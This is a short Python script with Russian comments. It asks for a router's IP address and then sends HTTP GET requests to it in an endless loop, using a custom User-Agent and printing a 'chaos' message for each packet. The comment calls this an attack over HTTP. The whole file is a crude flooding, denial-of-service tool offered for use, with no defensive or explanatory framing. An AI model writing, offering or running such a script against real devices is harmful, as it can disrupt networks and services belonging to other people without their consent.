import requests  
import time  

target_ip = input("IP роутера: ")  
url = f"http://{target_ip}/"  # Атакуем через HTTP  

while True:  
    try:  
        requests.get(url, headers={"User-Agent": "HAARROOIN"}, timeout=0.5)  
        print(f"[ХАОС] Пакет отправлен → {url}")  
    except:  
        pass  
